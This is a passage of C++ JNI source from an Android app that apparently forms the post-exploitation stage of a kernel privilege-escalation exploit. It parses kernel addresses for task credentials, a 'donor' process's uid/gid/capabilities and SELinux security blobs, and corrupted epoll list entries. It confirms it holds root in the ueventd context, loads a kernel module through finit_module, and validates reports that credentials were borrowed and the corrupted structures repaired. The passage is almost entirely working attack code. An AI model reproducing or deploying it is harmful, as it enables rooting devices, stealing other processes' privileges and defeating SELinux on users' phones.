        std::size_t end = value.find(',', cursor);
        if ((index < 6 && end == std::string::npos) ||
            (index == 6 && end != std::string::npos)) {
            return false;
        }
        if (end == std::string::npos) {
            end = value.size();
        }
        std::string item = value.substr(cursor, end - cursor);
        std::uint64_t parsed = 0;
        if (tids) {
            int tid = 0;
            if (!parse_int_field(item, &tid) || tid <= 0 ||
                !unique.insert(static_cast<std::uint64_t>(tid)).second) {
                return false;
            }
            g_ctlbuf_rescue_tids[index] = tid;
        } else {
            if (!parse_unsigned_long_field(item, &parsed) ||
                !kernel_pointer(parsed) || !unique.insert(parsed).second) {
                return false;
            }
            g_ctlbuf_rescue_nodes[index] = parsed;
        }
        cursor = end + 1;
    }
    return cursor == value.size() + 1;
}

int file_descriptor_value(JNIEnv* environment, jobject descriptor) {
    if (descriptor == nullptr) {
        return -1;
    }
    jclass type = environment->GetObjectClass(descriptor);
    if (type == nullptr) {
        return -1;
    }
    jfieldID field = environment->GetFieldID(type, "descriptor", "I");
    environment->DeleteLocalRef(type);
    if (field == nullptr || environment->ExceptionCheck()) {
        environment->ExceptionClear();
        return -1;
    }
    return environment->GetIntField(descriptor, field);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_installCtlbufRescuePlan(
        JNIEnv* environment, jclass, jstring plan_string,
        jobject module_descriptor, jint expected_app_pid) {
    if (plan_string == nullptr || module_descriptor == nullptr ||
        g_command_watchdog_phase.load(std::memory_order_acquire) !=
                kCommandWatchdogReady) {
        return environment->NewStringUTF(
                "status=fail stage=ctlbuf-rescue-plan-install reason=state");
    }
    const char* plan_chars = environment->GetStringUTFChars(
            plan_string, nullptr);
    if (plan_chars == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=ctlbuf-rescue-plan-install reason=plan");
    }
    std::string plan(plan_chars);
    environment->ReleaseStringUTFChars(plan_string, plan_chars);
    std::string prefix =
            "status=pass stage=ctlbuf-rescue-plan nonce=" +
            std::string(g_command_watchdog_nonce) +
            " module_sha256="
            "2b4e520b65f252c1c7a51c303f8bc228663f6804cbca00f2ebc6005c9a9f26f8"
            " params=";
    bool exact_prefix = plan.size() > prefix.size() &&
            plan.size() < 3072 && plan.compare(0, prefix.size(), prefix) == 0 &&
            plan.find('\n') == std::string::npos &&
            plan.find('\r') == std::string::npos;
    std::string parameters = exact_prefix
            ? plan.substr(prefix.size()) : std::string();
    const std::vector<const char*> names = {
            "tids", "nodes", "kernel_base", "expected_tgid",
            "helper_tid", "helper_task", "donor_cred", "private_cred",
            "donor_security_slot", "donor_security_original",
            "borrowed_task_security", "borrowed_task_security_word8",
            "inode_security_slot", "inode_security_original",
            "borrowed_inode_security", "borrowed_inode_security_word8",
            "owner_task", "owner_pid", "watched_fd", "arbitrary_fd",
            "reference_fd", "watched_file", "watched_inode",
            "watched_fops", "arbitrary_file", "arbitrary_inode",
            "arbitrary_fops", "reference_file", "reference_inode",
            "reference_fops", "selected_epitem", "expected_fops",
            "finalise_expected_count",
            "donor_task", "donor_pid", "donor_real_cred_slot",
            "donor_cred_slot", "donor_usage", "donor_uid", "donor_euid",
            "donor_suid", "donor_fsuid", "donor_gid", "donor_egid",
            "donor_sgid", "donor_fsgid", "donor_caps", "donor_sid",
            "donor_security",
    };
    std::map<std::string, std::string> fields;
    int expected_tgid = -1;
    int helper_tid = -1;
    int owner_pid = -1;
    int watched_fd = -1;
    int arbitrary_fd = -1;
    int reference_fd = -1;
    int donor_pid = -1;
    std::uint64_t pointer = 0;
    bool parsed = exact_prefix &&
            parse_ordered_record(parameters, names, &fields) &&
            parse_ctlbuf_list(fields["tids"], true) &&
            parse_ctlbuf_list(fields["nodes"], false) &&
            parse_int_field(fields["expected_tgid"], &expected_tgid) &&
            parse_int_field(fields["helper_tid"], &helper_tid) &&
            expected_app_pid > 0 && expected_app_pid != getpid() &&
            expected_tgid == expected_app_pid && helper_tid == getpid() &&
            parse_unsigned_long_field(fields["kernel_base"], &pointer) &&
            kernel_address(pointer) &&
            parse_int_field(fields["owner_pid"], &owner_pid) &&
            owner_pid == expected_app_pid &&
            parse_int_field(fields["watched_fd"], &watched_fd) &&
            parse_int_field(fields["arbitrary_fd"], &arbitrary_fd) &&
            parse_int_field(fields["reference_fd"], &reference_fd) &&
            watched_fd >= 0 && arbitrary_fd >= 0 && reference_fd >= 0 &&
            watched_fd != arbitrary_fd && watched_fd != reference_fd &&
            arbitrary_fd != reference_fd &&
            parse_int_field(fields["donor_pid"], &donor_pid) && donor_pid > 0;
    const std::vector<const char*> pointer_names = {
            "helper_task", "donor_cred", "private_cred",
            "donor_security_slot", "donor_security_original",
            "borrowed_task_security", "inode_security_slot",
            "inode_security_original", "borrowed_inode_security",
            "owner_task", "watched_file", "watched_inode", "watched_fops",
            "arbitrary_file", "arbitrary_inode", "arbitrary_fops",
            "reference_file", "reference_inode", "reference_fops",
            "selected_epitem", "expected_fops", "donor_task",
            "donor_real_cred_slot", "donor_cred_slot",
            "donor_security",
    };
    for (const char* name : pointer_names) {
        parsed = parsed &&
                parse_unsigned_long_field(fields[name], &pointer) &&
                kernel_address(pointer);
    }
    std::uint64_t scalar = 0;
    const std::vector<const char*> exact_scalars = {
            "borrowed_task_security_word8", "borrowed_inode_security_word8",
            "donor_usage", "donor_uid", "donor_euid", "donor_suid",
            "donor_fsuid", "donor_gid", "donor_egid", "donor_sgid",
            "donor_fsgid", "donor_sid",
    };
    for (const char* name : exact_scalars) {
        parsed = parsed && parse_unsigned_long_field(fields[name], &scalar) &&
                scalar <= UINT32_MAX;
    }
    parsed = parsed &&
            parse_unsigned_long_field(fields["donor_caps"], &scalar);
    CtlbufFinalisePlan parsed_finalise_plan;
    auto read_plan_pointer = [&](const char* name, std::uint64_t* target) {
        std::uint64_t value = 0;
        bool valid = parse_unsigned_long_field(fields[name], &value) &&
                kernel_address(value);
        if (valid && target != nullptr) {
            *target = value;
        }
        return valid;
    };
    parsed = parsed &&
            parse_int_field(fields["helper_tid"],
                    &parsed_finalise_plan.helper_tid) &&
            read_plan_pointer("helper_task", &parsed_finalise_plan.helper_task) &&
            read_plan_pointer("donor_cred", &parsed_finalise_plan.donor_cred) &&
            read_plan_pointer("private_cred", &parsed_finalise_plan.private_cred) &&
            read_plan_pointer("owner_task", &parsed_finalise_plan.owner_task) &&
            read_plan_pointer("watched_file", &parsed_finalise_plan.watched_file) &&
            read_plan_pointer("watched_inode", &parsed_finalise_plan.watched_inode) &&
            read_plan_pointer("watched_fops", &parsed_finalise_plan.watched_fops) &&
            read_plan_pointer("arbitrary_file", &parsed_finalise_plan.arbitrary_file) &&
            read_plan_pointer("arbitrary_inode", &parsed_finalise_plan.arbitrary_inode) &&
            read_plan_pointer("arbitrary_fops", &parsed_finalise_plan.arbitrary_fops) &&
            read_plan_pointer("reference_file", &parsed_finalise_plan.reference_file) &&
            read_plan_pointer("reference_inode", &parsed_finalise_plan.reference_inode) &&
            read_plan_pointer("reference_fops", &parsed_finalise_plan.reference_fops) &&
            read_plan_pointer("selected_epitem", &parsed_finalise_plan.selected_epitem) &&
            read_plan_pointer("expected_fops", &parsed_finalise_plan.expected_fops) &&
            read_plan_pointer("donor_task", &parsed_finalise_plan.donor_task) &&
            read_plan_pointer("donor_real_cred_slot",
                    &parsed_finalise_plan.donor_real_cred_slot) &&
            read_plan_pointer("donor_cred_slot",
                    &parsed_finalise_plan.donor_cred_slot) &&
            read_plan_pointer("donor_security",
                    &parsed_finalise_plan.donor_security) &&
            read_plan_pointer("donor_security_original",
                    &parsed_finalise_plan.donor_security_original) &&
            read_plan_pointer("inode_security_original",
                    &parsed_finalise_plan.inode_security_original) &&
            parse_unsigned_long_field(
                    fields["borrowed_task_security_word8"],
                    &parsed_finalise_plan.borrowed_task_security_word8) &&
            parse_unsigned_long_field(
                    fields["borrowed_inode_security_word8"],
                    &parsed_finalise_plan.borrowed_inode_security_word8);
    parsed = parsed &&
            parse_int_field(fields["owner_pid"], &parsed_finalise_plan.owner_pid) &&
            parse_int_field(fields["watched_fd"], &parsed_finalise_plan.watched_fd) &&
            parse_int_field(fields["arbitrary_fd"], &parsed_finalise_plan.arbitrary_fd) &&
            parse_int_field(fields["reference_fd"], &parsed_finalise_plan.reference_fd) &&
            parse_int_field(fields["donor_pid"], &parsed_finalise_plan.donor_pid);
    auto read_plan_u32 = [&](const char* name, std::uint32_t* target) {
        std::uint64_t value = 0;
        bool valid = parse_unsigned_long_field(fields[name], &value) &&
                value <= UINT32_MAX;
        if (valid && target != nullptr) {
            *target = static_cast<std::uint32_t>(value);
        }
        return valid;
    };
    parsed = parsed &&
            read_plan_u32("donor_usage", &parsed_finalise_plan.donor_usage) &&
            read_plan_u32("donor_uid", &parsed_finalise_plan.donor_ids[0]) &&
            read_plan_u32("donor_euid", &parsed_finalise_plan.donor_ids[1]) &&
            read_plan_u32("donor_suid", &parsed_finalise_plan.donor_ids[2]) &&
            read_plan_u32("donor_fsuid", &parsed_finalise_plan.donor_ids[3]) &&
            read_plan_u32("donor_gid", &parsed_finalise_plan.donor_ids[4]) &&
            read_plan_u32("donor_egid", &parsed_finalise_plan.donor_ids[5]) &&
            read_plan_u32("donor_sgid", &parsed_finalise_plan.donor_ids[6]) &&
            read_plan_u32("donor_fsgid", &parsed_finalise_plan.donor_ids[7]) &&
            read_plan_u32("donor_sid", &parsed_finalise_plan.donor_sid) &&
            parse_unsigned_long_field(fields["donor_caps"],
                    &parsed_finalise_plan.donor_caps);
    parsed = parsed && parsed_finalise_plan.watched_inode ==
            parsed_finalise_plan.reference_inode &&
            read_plan_u32("finalise_expected_count",
                    &parsed_finalise_plan.expected_count) &&
            (parsed_finalise_plan.expected_count == 1 ||
             parsed_finalise_plan.expected_count ==
                    kEpitemPreDrainCount + kEpitemCount);
    parsed_finalise_plan.valid = parsed;
    auto parse_cookie = [&](std::size_t offset, std::uint64_t* result) {
        std::string part(g_command_watchdog_nonce + offset, 16);
        char* end = nullptr;
        errno = 0;
        unsigned long long value = std::strtoull(part.c_str(), &end, 16);
        bool valid = errno == 0 && end == part.c_str() + part.size();
        if (valid) {
            *result = static_cast<std::uint64_t>(value);
        }
        return valid;
    };
    std::uint64_t resume_cookie_hi = 0;
    std::uint64_t resume_cookie_lo = 0;
    bool cookies_valid = std::strlen(g_command_watchdog_nonce) == 32 &&
            parse_cookie(0, &resume_cookie_hi) &&
            parse_cookie(16, &resume_cookie_lo) &&
            (resume_cookie_hi != 0 || resume_cookie_lo != 0);
    g_ctlbuf_donor_resume_record = CtlbufDonorResumeRecord {};
    volatile std::uint64_t* resume_prefault =
            &g_ctlbuf_donor_resume_record.magic;
    *resume_prefault = 0;
    char resume_parameters[192];
    int resume_parameter_length = std::snprintf(
            resume_parameters, sizeof(resume_parameters),
            " resume_user_addr=0x%" PRIxPTR
            " resume_user_size=%zu resume_cookie_hi=0x%" PRIx64
            " resume_cookie_lo=0x%" PRIx64,
            reinterpret_cast<std::uintptr_t>(&g_ctlbuf_donor_resume_record),
            sizeof(g_ctlbuf_donor_resume_record), resume_cookie_hi,
            resume_cookie_lo);
    bool resume_parameters_valid = cookies_valid &&
            resume_parameter_length > 0 &&
            resume_parameter_length <
                    static_cast<int>(sizeof(resume_parameters));
    parsed = parsed && resume_parameters_valid;
    std::string module_parameters = parsed
            ? parameters + resume_parameters : std::string();
    int source_fd = file_descriptor_value(environment, module_descriptor);
    int duplicate_fd = parsed && source_fd >= 0
            ? fcntl(source_fd, F_DUPFD_CLOEXEC, 3) : -1;
    bool installed = duplicate_fd >= 0;
    {
        std::lock_guard<std::mutex> lock(g_ctlbuf_rescue_plan_mutex);
        if (installed &&
            g_ctlbuf_rescue_plan_ready.load(std::memory_order_acquire) == 0 &&
            g_ctlbuf_rescue_module_fd < 0) {
            g_ctlbuf_rescue_plan = plan;
            g_ctlbuf_rescue_parameters = module_parameters;
            g_ctlbuf_rescue_module_fd = duplicate_fd;
            g_ctlbuf_finalise_plan = parsed_finalise_plan;
            g_ctlbuf_resume_cookie_hi = resume_cookie_hi;
            g_ctlbuf_resume_cookie_lo = resume_cookie_lo;
            duplicate_fd = -1;
            g_ctlbuf_rescue_plan_ready.store(1,
                    std::memory_order_release);
        } else {
            installed = false;
        }
    }
    if (duplicate_fd >= 0) {
        close(duplicate_fd);
    }
    return environment->NewStringUTF(installed
            ? "status=pass stage=ctlbuf-rescue-plan-install"
            : "status=fail stage=ctlbuf-rescue-plan-install reason=invalid");
}

std::string read_bounded_text(const char* path, std::size_t limit) {
    std::string value;
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        return value;
    }
    std::vector<char> buffer(limit + 1, 0);
    ssize_t count = read(fd, buffer.data(), limit + 1);
    int close_result = close(fd);
    if (count <= 0 || static_cast<std::size_t>(count) > limit ||
        close_result != 0) {
        return std::string();
    }
    value.assign(buffer.data(), static_cast<std::size_t>(count));
    while (!value.empty() &&
           (value.back() == '\n' || value.back() == '\r' ||
            value.back() == '\0')) {
        value.pop_back();
    }
    return value;
}

bool validate_ctlbuf_repair_status(const std::string& status) {
    std::string prefix = "status=pass count=7";
    if (status.compare(0, prefix.size(), prefix) != 0) {
        return false;
    }
    std::size_t cursor = prefix.size();
    std::set<std::uint64_t> slots;
    std::set<std::uint64_t> replacements;
    for (int index = 0; index < 7; ++index) {
        std::string item_prefix = " e" + std::to_string(index) + "=";
        if (status.compare(cursor, item_prefix.size(), item_prefix) != 0) {
            return false;
        }
        cursor += item_prefix.size();
        int tid = -1;
        unsigned long long node = 0;
        unsigned long long slot = 0;
        unsigned long long replacement = 0;
        unsigned int depth = 0;
        int consumed = 0;
        if (std::sscanf(status.c_str() + cursor,
                "%d/0x%llx/0x%llx/0x%llx/%u%n",
                &tid, &node, &slot, &replacement, &depth,
                &consumed) != 5 || consumed <= 0 ||
            tid != g_ctlbuf_rescue_tids[index] ||
            node != g_ctlbuf_rescue_nodes[index] ||
            !kernel_address(slot) || !kernel_pointer(replacement) ||
            depth == 0 || depth > 64 ||
            !slots.insert(slot).second ||
            !replacements.insert(replacement).second) {
            return false;
        }
        cursor += static_cast<std::size_t>(consumed);
    }
    return cursor == status.size();
}

bool validate_ctlbuf_finalise_status(
        const std::string& status, int expected_helper_pid) {
    CtlbufFinalisePlan plan;
    {
        std::lock_guard<std::mutex> lock(g_ctlbuf_rescue_plan_mutex);
        plan = g_ctlbuf_finalise_plan;
    }
    if (!plan.valid || expected_helper_pid <= 0 ||
        plan.helper_tid != expected_helper_pid) {
        return false;
    }
    const std::vector<const char*> names = {
            "status", "stage", "reason", "error", "helper_pid",
            "helper_task", "helper_borrowed", "owner_task", "owner_pid",
            "watched_fd", "arbitrary_fd", "reference_fd", "watched_file",
            "watched_inode", "arbitrary_file", "arbitrary_inode",
            "reference_file", "reference_inode", "watched_fops",
            "arbitrary_fops", "reference_fops", "selected_epitem",
            "expected_fops", "expected_count", "reverse_count", "forward_count",
            "non_selected_forward", "reverse_relationships", "pre_inode",
            "pre_next", "successor", "post_link", "final_post_link",
            "restored_link", "restored_inode",
            "restored_inode_value", "restored_inode_source",
            "forward_cycle", "reverse_cycle", "readbacks", "donor_task",
            "donor_pid", "donor_real_cred_slot", "donor_cred_slot",
            "donor_cred", "donor_usage", "donor_uid", "donor_euid",
            "donor_suid", "donor_fsuid", "donor_gid", "donor_egid",
            "donor_sgid", "donor_fsgid", "donor_caps", "donor_sid",
            "donor_repair", "donor_frozen", "donor_snapshot_a",
            "donor_snapshot_b", "donor_snapshot_stage", "donor_state",
            "donor_observed_pid", "donor_observed_tgid",
            "donor_observed_real_cred", "donor_observed_cred",
            "donor_observed_real_slot", "donor_observed_cred_slot",
            "donor_observed_usage", "donor_file_refs", "donor_open_fds",
            "donor_max_fds", "donor_ids_mask",
            "donor_observed_caps", "donor_observed_repair",
            "donor_observed_security", "donor_observed_security_word8",
            "donor_observed_sid", "list_exact", "proof",
    };
    std::map<std::string, std::string> fields;
    if (!parse_ordered_record(status, names, &fields) ||
        fields["status"] != "pass" ||
        fields["stage"] != "ctlbuf-finalise" ||
        fields["reason"] != "none" || fields["error"] != "0") {
        return false;
    }
    auto exact_int = [&](const char* name, int expected) {
        int value = 0;
        return parse_int_field(fields[name], &value) && value == expected;
    };
    auto exact_u32 = [&](const char* name, std::uint32_t expected) {
        std::uint64_t value = 0;
        return parse_unsigned_long_field(fields[name], &value) &&
                value == expected;
    };
    auto exact_ptr = [&](const char* name, std::uint64_t expected) {
        std::uint64_t value = 0;
        return parse_unsigned_long_field(fields[name], &value) &&
                value == expected && kernel_address(value);
    };
    auto exact_value = [&](const char* name, std::uint64_t expected) {
        std::uint64_t value = 0;
        return parse_unsigned_long_field(fields[name], &value) &&
                value == expected;
    };
    auto contains_bits = [&](const char* name, std::uint64_t expected) {
        std::uint64_t value = 0;
        return parse_unsigned_long_field(fields[name], &value) &&
                (value & expected) == expected;
    };
    std::uint64_t donor_observed_usage = 0;
    std::uint64_t donor_file_refs = 0;
    std::uint64_t donor_open_fds = 0;
    std::uint64_t donor_max_fds = 0;
    std::uint64_t successor = 0;
    bool successor_valid = parse_unsigned_long_field(
            fields["successor"], &successor);
    bool donor_file_accounting =
            parse_unsigned_long_field(
                    fields["donor_observed_usage"],
                    &donor_observed_usage) &&
            parse_unsigned_long_field(
                    fields["donor_file_refs"], &donor_file_refs) &&
            parse_unsigned_long_field(
                    fields["donor_open_fds"], &donor_open_fds) &&
            parse_unsigned_long_field(
                    fields["donor_max_fds"], &donor_max_fds) &&
            donor_file_refs >= 1 && donor_file_refs <= 64 &&
            donor_open_fds <= 16384 &&
            donor_max_fds > 0 && donor_max_fds <= 65536 &&
            donor_file_refs <= donor_open_fds &&
            donor_open_fds <= donor_max_fds &&
            donor_file_refs <= UINT32_MAX - plan.donor_usage &&
            donor_observed_usage == plan.donor_usage + donor_file_refs;
    bool pass = exact_int("helper_pid", expected_helper_pid) &&
            exact_ptr("helper_task", plan.helper_task) &&
            exact_int("helper_borrowed", 1) &&
            exact_ptr("owner_task", plan.owner_task) &&
            exact_int("owner_pid", plan.owner_pid) &&
            exact_int("watched_fd", plan.watched_fd) &&
            exact_int("arbitrary_fd", plan.arbitrary_fd) &&
            exact_int("reference_fd", plan.reference_fd) &&
            exact_ptr("watched_file", plan.watched_file) &&
            exact_ptr("watched_inode", plan.watched_inode) &&
            exact_ptr("arbitrary_file", plan.arbitrary_file) &&
            exact_ptr("arbitrary_inode", plan.arbitrary_inode) &&
            exact_ptr("reference_file", plan.reference_file) &&
            exact_ptr("reference_inode", plan.reference_inode) &&
            exact_ptr("watched_fops", plan.watched_fops) &&
            exact_ptr("arbitrary_fops", plan.arbitrary_fops) &&
            exact_ptr("reference_fops", plan.reference_fops) &&
            exact_ptr("selected_epitem", plan.selected_epitem) &&
            exact_ptr("expected_fops", plan.expected_fops) &&
            fields["restored_inode_source"] == "reference" &&
            exact_ptr("restored_inode_value", plan.reference_inode) &&
            plan.watched_inode == plan.reference_inode &&
            exact_u32("expected_count", plan.expected_count) &&
            exact_u32("reverse_count", plan.expected_count) &&
            exact_u32("forward_count", plan.expected_count) &&
            exact_u32("non_selected_forward", plan.expected_count - 1) &&
            exact_u32("reverse_relationships", plan.expected_count) &&
            exact_ptr("pre_inode", plan.selected_epitem + 0x50) &&
            exact_ptr("pre_next", plan.arbitrary_file + 0x20) &&
            successor_valid && exact_ptr("successor", successor) &&
            exact_ptr("post_link", successor) &&
            exact_ptr("final_post_link", successor) &&
            exact_int("restored_link", 1) &&
            exact_int("restored_inode", 1) &&
            exact_int("forward_cycle", 1) &&
            exact_int("reverse_cycle", 1) &&
            exact_int("readbacks", 1) &&
            exact_ptr("donor_task", plan.donor_task) &&
            exact_int("donor_pid", plan.donor_pid) &&
            exact_ptr("donor_real_cred_slot", plan.donor_real_cred_slot) &&
            exact_ptr("donor_cred_slot", plan.donor_cred_slot) &&
            exact_ptr("donor_cred", plan.donor_cred) &&
            exact_u32("donor_usage", plan.donor_usage) &&
            exact_u32("donor_uid", plan.donor_ids[0]) &&
            exact_u32("donor_euid", plan.donor_ids[1]) &&
            exact_u32("donor_suid", plan.donor_ids[2]) &&
            exact_u32("donor_fsuid", plan.donor_ids[3]) &&
            exact_u32("donor_gid", plan.donor_ids[4]) &&
            exact_u32("donor_egid", plan.donor_ids[5]) &&
            exact_u32("donor_sgid", plan.donor_ids[6]) &&
            exact_u32("donor_fsgid", plan.donor_ids[7]) &&
            exact_value("donor_caps", plan.donor_caps) &&
            exact_u32("donor_sid", plan.donor_sid) &&
            exact_value("donor_repair", 0) &&
            exact_u32("donor_frozen", 1) &&
            exact_u32("donor_snapshot_a", 1) &&
            exact_u32("donor_snapshot_b", 1) &&
            exact_u32("donor_snapshot_stage", 17) &&
            contains_bits("donor_state", 4U) &&
            exact_int("donor_observed_pid", plan.donor_pid) &&
            exact_int("donor_observed_tgid", plan.donor_pid) &&
            exact_ptr("donor_observed_real_cred", plan.donor_cred) &&
            exact_ptr("donor_observed_cred", plan.donor_cred) &&
            exact_ptr("donor_observed_real_slot", plan.donor_cred) &&
            exact_ptr("donor_observed_cred_slot", plan.donor_cred) &&
            donor_file_accounting &&
            exact_value("donor_ids_mask", 0xffU) &&
            exact_value("donor_observed_caps", plan.donor_caps) &&
            exact_value("donor_observed_repair", 0) &&
            exact_ptr("donor_observed_security", plan.donor_security) &&
            exact_value("donor_observed_security_word8", 0) &&
            exact_u32("donor_observed_sid", plan.donor_sid) &&
            exact_u32("list_exact", 1) && exact_u32("proof", 1);
    return pass;
}

bool validate_ctlbuf_donor_resume_status(
        const CtlbufDonorResumeRecord& record,
        int expected_helper_pid, CtlbufDonorResumeProof* proof) {
    CtlbufFinalisePlan plan;
    {
        std::lock_guard<std::mutex> lock(g_ctlbuf_rescue_plan_mutex);
        plan = g_ctlbuf_finalise_plan;
    }
    if (!plan.valid || expected_helper_pid <= 0 || proof == nullptr) {
        return false;
    }
    constexpr std::uint64_t kStoppedOrTraced = 0xc;
    std::uint64_t expected_commit = kCtlbufResumeMagic ^
            g_ctlbuf_resume_cookie_hi ^ g_ctlbuf_resume_cookie_lo ^
            plan.donor_task ^ kCtlbufResumeCommitXor;
    bool valid = record.magic == kCtlbufResumeMagic &&
            record.version == kCtlbufResumeVersion &&
            record.size == sizeof(record) &&
            record.cookie_hi == g_ctlbuf_resume_cookie_hi &&
            record.cookie_lo == g_ctlbuf_resume_cookie_lo &&
            record.helper_task == plan.helper_task &&
            record.helper_pid == expected_helper_pid &&
            plan.helper_tid == expected_helper_pid &&
            record.donor_task == plan.donor_task &&
            record.donor_pid == plan.donor_pid &&
            record.donor_tgid == plan.donor_pid &&
            record.signal == SIGCONT && record.signal_rc == 0 &&
            record.signal_errno == 0 &&
            (record.pre_state & kStoppedOrTraced) != 0 &&
            record.pre_exit_state == 0 &&
            record.pre_thread_count > 0 &&
            record.pre_thread_count <= 4096 &&
            record.pre_stopped_count == record.pre_thread_count &&
            (record.post_state & kStoppedOrTraced) == 0 &&
            record.post_exit_state == 0 &&
            record.post_thread_count > 0 &&
            record.post_thread_count <= 4096 &&
            record.post_stopped_count == 0 &&
            record.stable_samples == 2 &&
            record.task_security == plan.donor_security_original &&
            record.task_security_word8 ==
                    plan.borrowed_task_security_word8 &&
            record.inode_security == plan.inode_security_original &&
            record.inode_security_word8 ==
                    plan.borrowed_inode_security_word8 &&
            record.labels_restored == 1 && record.resumed == 1 &&
            record.proof == 1 && record.commit == expected_commit;
    if (!valid) {
        return false;
    }
    proof->valid = true;
    proof->cookie_hi = record.cookie_hi;
    proof->cookie_lo = record.cookie_lo;
    proof->helper_task = record.helper_task;
    proof->donor_task = record.donor_task;
    proof->donor_pid = record.donor_pid;
    proof->donor_tgid = record.donor_tgid;
    proof->signal_result = record.signal_rc;
    proof->signal_errno = record.signal_errno;
    proof->before_state = record.pre_state;
    proof->before_exit_state = record.pre_exit_state;
    proof->after_state = record.post_state;
    proof->after_exit_state = record.post_exit_state;
    proof->before_threads = record.pre_thread_count;
    proof->before_stopped = record.pre_stopped_count;
    proof->after_threads = record.post_thread_count;
    proof->after_stopped = record.post_stopped_count;
    proof->stable_samples = record.stable_samples;
    proof->task_security = record.task_security;
    proof->task_security_word8 = record.task_security_word8;
    proof->inode_security = record.inode_security;
    proof->inode_security_word8 = record.inode_security_word8;
    return true;
}

std::string format_ctlbuf_donor_resume_status(
        const CtlbufDonorResumeRecord& record) {
    char status[1024];
    int length = std::snprintf(
            status, sizeof(status),
            "status=pass stage=donor-resume magic=0x%" PRIx64
            " version=%u size=%u cookie_hi=0x%" PRIx64
            " cookie_lo=0x%" PRIx64 " helper_task=0x%" PRIx64
            " helper_pid=%d donor_task=0x%" PRIx64
            " donor_pid=%d donor_tgid=%d signal=%d signal_result=%d"
            " signal_errno=%d before_state=0x%" PRIx64
            " before_exit_state=0x%" PRIx64 " before_threads=%u"
            " before_stopped=%u after_state=0x%" PRIx64
            " after_exit_state=0x%" PRIx64 " after_threads=%u"
            " after_stopped=%u stable_samples=%u"
            " task_security=0x%" PRIx64
            " task_security_word8=0x%" PRIx64
            " inode_security=0x%" PRIx64
            " inode_security_word8=0x%" PRIx64
            " labels_restored=%u resumed=%u proof=%u commit=0x%" PRIx64,
            record.magic, record.version, record.size, record.cookie_hi,
            record.cookie_lo, record.helper_task, record.helper_pid,
            record.donor_task, record.donor_pid, record.donor_tgid,
            record.signal, record.signal_rc, record.signal_errno,
            record.pre_state, record.pre_exit_state,
            record.pre_thread_count, record.pre_stopped_count,
            record.post_state, record.post_exit_state,
            record.post_thread_count, record.post_stopped_count,
            record.stable_samples, record.task_security,
            record.task_security_word8, record.inode_security,
            record.inode_security_word8, record.labels_restored,
            record.resumed, record.proof, record.commit);
    if (length <= 0 || length >= static_cast<int>(sizeof(status))) {
        return std::string();
    }
    return std::string(status, static_cast<std::size_t>(length));
}

bool execute_ctlbuf_rescue() {
    std::string parameters;
    int module_fd = -1;
    {
        std::lock_guard<std::mutex> lock(g_ctlbuf_rescue_plan_mutex);
        if (g_ctlbuf_rescue_plan_ready.load(std::memory_order_acquire) != 1 ||
            g_ctlbuf_rescue_module_fd < 0) {
            write_ctlbuf_rescue_stage(1, "plan", -1, EPROTO, 0);
            return false;
        }
        parameters = g_ctlbuf_rescue_parameters;
        module_fd = g_ctlbuf_rescue_module_fd;
    }
    std::string context = read_bounded_text(
            "/proc/self/attr/current", 64);
    CommandRootIdentity identity;
    errno = 0;
    int seccomp = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
    int seccomp_errno = seccomp >= 0 ? 0 : errno;
    bool identity_read = read_command_root_identity(&identity);
    int gate_bits =
            (context == "u:r:ueventd:s0" ? 2 : 0) |
            (seccomp == 0 ? 4 : 0) |
            (identity_read ? 8 : 0) |
            (identity_read && identity.pid == getpid() &&
                    identity.tid == getpid() ? 16 : 0) |
            (identity_read && command_identity_is_root(identity) ? 32 : 0) |
            (identity_read &&
                    (identity.effective_caps &
                     (UINT64_C(1) << CAP_SYS_MODULE)) != 0 ? 64 : 0);
    bool gates = gate_bits == 126;
    write_ctlbuf_rescue_stage(
            2, "gates", gates ? 0 : -1, seccomp_errno, gate_bits);
    char fd_path[64];
    int path_length = std::snprintf(
            fd_path, sizeof(fd_path), "/proc/self/fd/%d", module_fd);
    errno = 0;
    int reopened = gates && path_length > 0 &&
            path_length < static_cast<int>(sizeof(fd_path))
            ? open(fd_path, O_RDONLY | O_CLOEXEC) : -1;
    int reopen_errno = reopened >= 0 ? 0 : errno;
    write_ctlbuf_rescue_stage(
            3, "reopen", reopened >= 0 ? 0 : -1,
            reopen_errno, reopened);
    if (reopened < 0) {
        return false;
    }
    write_ctlbuf_rescue_stage(4, "module-load-start", 0, 0, reopened);
    errno = 0;
    int load_result = static_cast<int>(syscall(
            SYS_finit_module, reopened, parameters.c_str(), 0));
    int load_errno = load_result == 0 ? 0 : errno;
    bool close_ok = close(reopened) == 0;
    write_ctlbuf_rescue_stage(
            5, "module-load", load_result, load_errno,
            close_ok ? 1 : 0);
    if (load_result != 0 || load_errno != 0 || !close_ok) {
        return false;
    }
    g_ctlbuf_rescue_module_loaded = true;
    std::string status = read_bounded_text(
            "/sys/module/lp3_ctlbuf_rescue/parameters/repair_status", 2048);
    bool status_valid = validate_ctlbuf_repair_status(status);
    write_ctlbuf_rescue_stage(
            6, "module-status", status_valid ? 0 : -1, 0,
            static_cast<int>(status.size()));
    return status_valid;
}

bool finalise_ctlbuf_rescue() {
    CommandRootIdentity identity;
    std::string context = read_bounded_text(
            "/proc/self/attr/current", 64);
    errno = 0;
    int seccomp = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
    bool leader = read_command_root_identity(&identity) &&
            identity.pid == getpid() && identity.tid == getpid() &&
            command_identity_is_root(identity) &&
            context == "u:r:ueventd:s0" && seccomp == 0;
    if (!leader || !g_ctlbuf_rescue_module_loaded) {
        write_ctlbuf_rescue_stage(7, "finalise-gate", -1,
                errno == 0 ? EPROTO : errno, leader ? 1 : 0);
        return false;
    }
    int request_fd = open(
            "/sys/module/lp3_ctlbuf_rescue/parameters/finalise_request",
            O_WRONLY | O_CLOEXEC);
    const char request[] = "1";
    errno = 0;
    ssize_t written = request_fd >= 0
            ? write(request_fd, request, sizeof(request) - 1) : -1;
    int request_errno = written == static_cast<ssize_t>(sizeof(request) - 1)
            ? 0 : errno;
    bool request_closed = request_fd < 0 || close(request_fd) == 0;
    write_ctlbuf_rescue_stage(
            8, "module-finalise-request",
            written == static_cast<ssize_t>(sizeof(request) - 1) &&
                    request_closed ? 0 : -1,
            request_errno, static_cast<int>(written));
    if (written != static_cast<ssize_t>(sizeof(request) - 1) ||
        !request_closed) {
        return false;
    }
    std::string status = read_bounded_text(
